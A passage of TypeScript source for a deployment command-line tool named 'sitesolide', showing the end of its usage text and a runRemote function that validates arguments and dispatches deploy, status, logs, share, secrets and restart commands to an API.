  "  sitesolide login --url <https://dashboard.zone>   keep the token, check it",
  "     --token-stdin                                  read it from standard input",
  "  sitesolide deploy                                 build here, upload, follow the machine's log",
  "  sitesolide status                                 the projects this token may deploy",
  "  sitesolide logs [--follow]                        the journal of this folder's project",
  "     --lines <n>                                    how many lines back, 50 by default, 500 at most",
  "  sitesolide share                                  this folder's project's general access and people with access",
  "     <email|@domain>...                             give them Can open: people inside the company's domains, or one of them",
  "     --remove <email|@domain>...                    take their Can open away",
  "  sitesolide secrets                                this folder's project's secret files and variable names, never a value",
  "  sitesolide secrets set <NAME>                     set a variable of <slug>.env, typed at a prompt that does not echo it",
  "     --stdin                                        the value from standard input, one trailing line break dropped",
  "  sitesolide secrets remove <NAME>...               take variables out of <slug>.env",
  "     --restart                                      with set or remove: then restart the service, and say whether it holds",
  "  sitesolide restart                                restart this folder's project's service, and say whether it holds",
  "",
  "--json, on every one of them: one JSON event per line, see docs/agents.md",
  "a secret's value never goes on the command line: with --json, secrets set needs --stdin",
  "SITESOLIDE_API and SITESOLIDE_TOKEN, both in the environment, win over the files.",
];

/** Runs a command through the API; the exit code is returned, never thrown. */
export async function runRemote(command: string, arguments_: string[], dependencies: RemoteDependencies): Promise<number> {
  const output = dependencies.output ?? humanOutput;
  const remote = readRemote(dependencies.environment, dependencies.home ?? homedir());
  if (SSH_COMMANDS.includes(command)) return report(output, needsSsh(command));
  if (!["deploy", "status", "logs", "share", "secrets", "restart"].includes(command)) {
    const [title, ...usage] = REMOTE_USAGE;
    return report(output, { error: "usage", message: command === "" ? (title ?? "usage") : `unknown command with a token: ${command}`, details: command === "" ? usage : REMOTE_USAGE });
  }
  // `secrets` reads its own arguments: unknownOptions quotes the option it
  // refuses, and an argument of `secrets set` may be a value.
  const asked = command === "secrets" ? readSecretsArguments(arguments_) : null;
  if (asked !== null && "error" in asked) return report(output, asked);
  const refused = command === "secrets" ? null : unknownOptions(command, arguments_);
  if (refused !== null) return report(output, refused);
  const marker = arguments_.indexOf("--lines");
  const lines = marker === -1 ? "50" : (arguments_[marker + 1] ?? "");
  if (command === "logs" && (!/^[0-9]+$/.test(lines) || Number(lines) < 1 || Number(lines) > 500)) {
    return report(output, { error: "invalid", message: `--lines: ${lines || "nothing given"} is not a number of lines between 1 and 500, what the API returns at most` });
  }
  if ("missing" in remote) return report(output, { error: "unauthenticated", message: remote.missing });
  switch (command) {
    case "deploy":
      return deploy(remote, dependencies);
    case "status":
      return status(remote, dependencies);
    case "share":
    case "secrets":
    case "restart": {
      const slug = folderSlug(dependencies.folder);
      if (typeof slug !== "string") return report(output, slug);
      if (command === "share") return share(arguments_, slug, apiAccess(remote, dependencies.fetcher), output);
      if (command === "restart") return restartProject(remote, slug, dependencies);
      if (asked === null || asked.action === "list") return listSecrets(remote, slug, dependencies);
      return changeSecrets(remote, slug, asked, dependencies);
    }
    default:
      return logs(remote, dependencies, arguments_.includes("--follow"), Number(lines));
  }
}
